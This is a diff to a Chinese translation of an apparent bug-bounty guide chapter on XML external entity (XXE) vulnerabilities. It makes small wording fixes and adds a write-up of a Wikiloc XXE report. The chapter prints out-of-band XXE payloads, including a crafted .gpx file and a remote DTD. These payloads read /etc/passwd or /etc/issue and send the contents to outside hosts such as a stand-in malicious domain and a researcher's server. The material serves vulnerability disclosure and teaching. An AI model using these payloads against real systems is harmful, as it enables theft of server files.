@@ -67,7 +67,7 @@ XML DTD 就像是所使用的標簽的定義文檔，並且由 XML 設計者或�
 </jobs>
 ```
 
-這裡，我們擁有了內部 DTD 聲明。要註意我們仍然使用一個聲明頭部開始，表示我們的文檔遵循 XML 1.0 和 UTF8 編碼。但是之後，我們為 XML 定義了要遵循的`DOCTYPE`。使用外部 DTD 是類似的，除了`!DOCTYPE是<!DOCTYPE note SYSTEM "jobs.dtd">`。XML 解析器在解析 XML 文件時，之後會解析`jobs.dtd`的內容。這非常重要，因為`!ENTITY`標簽被近似處理，並且是我們利用的關鍵。
+這裡，我們擁有了內部 DTD 聲明。要注意我們仍然使用一個聲明頭部開始，表示我們的文檔遵循 XML 1.0 和 UTF8 編碼。但是之後，我們為 XML 定義了要遵循的`DOCTYPE`。使用外部 DTD 是類似的，除了`!DOCTYPE是<!DOCTYPE note SYSTEM "jobs.dtd">`。XML 解析器在解析 XML 文件時，之後會解析`jobs.dtd`的內容。這非常重要，因為`!ENTITY`標簽被近似處理，並且是我們利用的關鍵。
 
 XML 實體像是一個訊息的占位符。再次使用我們之前的例子。，如果我們想讓每個職位都包含到我們網站的連結，每次都編寫地址簡直太麻煩了，尤其是 URL 可能改變的時候。反之，我們可以使用`!ENTITY`，並且讓解析器在解析時獲取內容，並插入到文檔中。你可以看看我們在哪裏這樣做。
 
@@ -95,7 +95,7 @@ XML 實體像是一個訊息的占位符。再次使用我們之前的例子。�
 ```
 
 
-這裡你會註意到，我繼續並添加了`Website`的`!ELEMENT`，但是不是`#PCDATA`，而是`ANY`。這意味著`Website`可以包含任何可解析的資料組合。我也定義了一個`!ENTITY`，帶有`SYSTEM`屬性，告訴解析器獲取`wensite.txt`文件的資料。現在一切都清楚了。
+這裡你會注意到，我繼續並添加了`Website`的`!ELEMENT`，但是不是`#PCDATA`，而是`ANY`。這意味著`Website`可以包含任何可解析的資料組合。我也定義了一個`!ENTITY`，帶有`SYSTEM`屬性，告訴解析器獲取`wensite.txt`文件的資料。現在一切都清楚了。
 <p>
 
 將它們放到一起，如果我包含了`/etc/passwd`，而不是`website.txt`，你覺得會發生什麽？你可能戶菜刀，我們的 XML 會被解析，並且服務器敏感文件`/etc/passwd`的內容會包含進我們的內容。但是我們是 XML 的作者，所以為什麽要這麽做呢？
@@ -127,7 +127,7 @@ XML 實體像是一個訊息的占位符。再次使用我們之前的例子。�
 <foo>&callhome;</foo>
 ```
 
-在解釋它之前，你可能已經註意到我在`callhome` URL 中使用了`%`來代替`&`，`%xxe`。這是因為`%`用於實體在 DTD 定義內部被求值的情況，而`&`用於實體在 XML 文檔中被求值的情況。現在，當 XML 文檔被解析，`callhome !ENTITY`會讀取`/etc/passwd`的內容，並遠端呼叫`http://www.malicous.com`，將文件內容作為 URL 參數來發送，因為我們控制了該服務器，我們可以檢查我們的日誌，並且足夠確保擁有了`/etc/passwd`的內容。Web 應用的遊戲就結束了。
+在解釋它之前，你可能已經注意到我在`callhome` URL 中使用了`%`來代替`&`，`%xxe`。這是因為`%`用於實體在 DTD 定義內部被求值的情況，而`&`用於實體在 XML 文檔中被求值的情況。現在，當 XML 文檔被解析，`callhome !ENTITY`會讀取`/etc/passwd`的內容，並遠端呼叫`http://www.malicous.com`，將文件內容作為 URL 參數來發送，因為我們控制了該服務器，我們可以檢查我們的日誌，並且足夠確保擁有了`/etc/passwd`的內容。Web 應用的遊戲就結束了。
 
 所以，站點如何防範 XXE 漏洞？它們可以禁止解析任何外部實體。
 
@@ -204,7 +204,7 @@ URL：facebook.com/careers
 ```
 
 
-你會想到，在解析的時候，如果受害者開啟了外部實體，XML 解析器會呼叫遠端主機。要註意`!ENTITY`定義中和下面使用了`%`。這是因為這些占位符用在 DTD 自身中。在收到請求呼叫之後，遠端服務器會發送回 DTD 文件，像這樣：
+你會想到，在解析的時候，如果受害者開啟了外部實體，XML 解析器會呼叫遠端主機。要注意`!ENTITY`定義中和下面使用了`%`。這是因為這些占位符用在 DTD 自身中。在收到請求呼叫之後，遠端服務器會發送回 DTD 文件，像這樣：
 
 ```xml
 <!ENTITY send SYSTEM 'http://197.37.102.90/?%26file;'>"
@@ -233,3 +233,91 @@ Facebook 官方回覆
 >有時候你不會直接從 XXE >收到響應，這個示例展示了如何建立服務器來接受請求，它展示了 XXE。
 >
 >此外，像我們的例子中那樣，有時報告一開始會被拒絕。擁有訊息和耐心和你報告的公司周旋非常重要。尊重他們的決策，同時也解釋為什麽這可能是個漏洞。
+
+
+---
+
+## **3. Wikiloc XXE**
+```
+難度：高
+
+URL：wikiloc.com
+
+報告連結：http://www.davidsopas.com/wikiloc-xxe-vulnerability
+
+報告日期：2015.10
+獎金：Swag
+```
+描述：
+
+根據他們的站定，Wikiloc 是個用於發現和分享最佳戶外遠足、騎車以及許多其他運動記錄的地方。有趣的是，他們也讓用戶通過 XML 文件上傳他們自己的記錄，這就對例如 David Soaps 之類的騎手非常有吸引力了。
+<p>
+
+基於他們的 Write Up，David 註冊了 Wikiloc，並注意到了 XML 上傳點，決定測試它有沒有 XXE 漏洞。最開始，它從站點下載了文件來判斷 XML 結構，這裡是一個`.gpx`文件，並插入了`*<!DOCTYPE foo [<!ENTITY xxe SYSTEM “http://www.davidsopas.com/XXE” > ]>;`。
+<p>
+
+之後它呼叫了`.gpx`文件中 13 行的記錄名稱中的實體。
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://www.davidsopas.com/XXE" > ]>
+<gpx
+version="1.0"
+creator="GPSBabel - http://www.gpsbabel.org"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns="http://www.topografix.com/GPX/1/0"
+xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd">
+<time>2015-10-29T12:53:09Z</time>
+<bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000" maxlon="-8.037170000"/>
+<trk>
+<name>&xxe;</name>
+<trkseg>
+<trkpt lat="40.737758000" lon="-8.093361000">
+<ele>178.000000</ele>
+<time>2009-01-10T14:18:10Z</time>
+(...)
+```
+
+這產生了發往服務器的 HTTP GET 請求，`GET 144.76.194.66 /XXE/ 10/29/15 1:02PM Java/1.7.0_51`。這有兩個原因值得注意，首先，通過使用一個概念呼叫的簡單證明，David 能夠確認服務器求解了它插入的 XML 並且進行了外部呼叫。其次，David 使用現存的 XML 文件，以便時它的內容滿足站點所預期的結構。雖然它沒有討論這個，呼叫它的服務器可能並不是必須的，如果它能夠服務`/etc/passwd`文件，並將內容渲染在`<name>`元素中。
+
+在確認 Wikiloc 會生成外部 HTTP 請求後，唯一的疑問就是，是否它能夠讀取本地文件。所以，它修改了註入的 XML，來讓 Wikiloc 向他發送它們的`/etc/passwd`文件內容。
+
+```xml
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "file:///etc/issue">
+<!ENTITY % dtd SYSTEM "http://www.davidsopas.com/poc/xxe.dtd">
+%dtd;]>
+<gpx
+version="1.0"
+creator="GPSBabel - http://www.gpsbabel.org"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns="http://www.topografix.com/GPX/1/0"
+xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd">
+<time>2015-10-29T12:53:09Z</time>
+<bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000" maxlon="-8.037170000"/>
+<trk>
+<name>&send;</name>
+(...)
+```
+
+這看起來十分熟悉。這裡他使用了兩個實體，它們都在 DTD 中求值，所以它們使用%定義。`&send`;在`<name>`標簽中的的引用實際上由返回的`xxe.dtd`文件定義，他的服務器將其發送回 Wikiloc。這裡是這個文件：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://www.davidsopas.com/XXE?%file;'>">
+%all;
+```
+
+要注意`%all`;實際上定義了`!ENTITY send`，我們剛剛在`<name>`標簽中注意到它。這裡是求值的過程：
+1. Wikiloc 解析了 XML，並將`%dtd`;求值為 David 的服務器的外部呼叫。
+2. David 的服務器向 Wikiloc 返回了`xxe.dtd`文件。
+3. Wikiloc 解析了收到的 DTD文件，它觸發了`%all`;的呼叫。
+4. 當`%all`;求值時，它定義了`&send;`，它包含`%file`實體的呼叫。
+5. `%file`;在 URL 值中被替換為`/etc/passwd`文件的內容。
+6. Wikiloc 解析了 XML 文件，發現了`&send`;實體，它求值為 David 服務器的遠程呼叫，帶有`/etc/passwd`的內容，作為 URL 中的參數。
+
+用他自己的話來說，遊戲結束了。
+
+>重要結論
+>
+>像之前提到的那樣，這是一個不錯的例子，展示了如何使用來自站點的 XML 模板，來組裝你自己的 XML 實體，便於讓目標合理地解析文件。
+>這裡，Wikiloc期待`.gpx`文件，而 David 保留了該結構，在預期標簽中插入了他自己的 XML 實體，也就是`<name>`標簽。此外，觀察如何處理惡意 DTD 文件很有意思，並且可以用於隨後讓目標向你的 服務器發送 GET 請求，帶有文件內容作為 URL 參數
